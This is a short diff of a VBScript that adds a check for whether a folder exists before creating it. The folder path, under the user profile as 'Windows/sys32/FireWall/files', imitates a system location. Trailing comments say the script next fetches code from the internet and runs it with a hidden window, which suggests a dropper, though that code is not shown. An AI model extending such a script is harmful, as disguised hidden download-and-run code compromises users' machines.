@@ -8,9 +8,13 @@ Set script = Wscript.CreateObject("WScript.shell")
 Dim oFSO
 Set oFSO = CreateObject("Scripting.FileSystemObject")
 
-' Create a new folder
-oFSO.CreateFolder script.ExpandEnvironmentStrings("%USERPROFILE%") & "/Windows/sys32/FireWall/files"
+Dim folderExists
+folderExists = oFSO.FolderExists(script.ExpandEnvironmentStrings("%USERPROFILE%") & "/Windows/sys32/FireWall/files")
+msgbox (folderExists)
 
+if (Not folderExists) Then
+	oFSO.CreateFolder script.ExpandEnvironmentStrings("%USERPROFILE%") & "/Windows/sys32/FireWall/files"
+End if
 
 'Get the code we need to run from the internet
 '0=Hide window, TRUE=Use same thread 
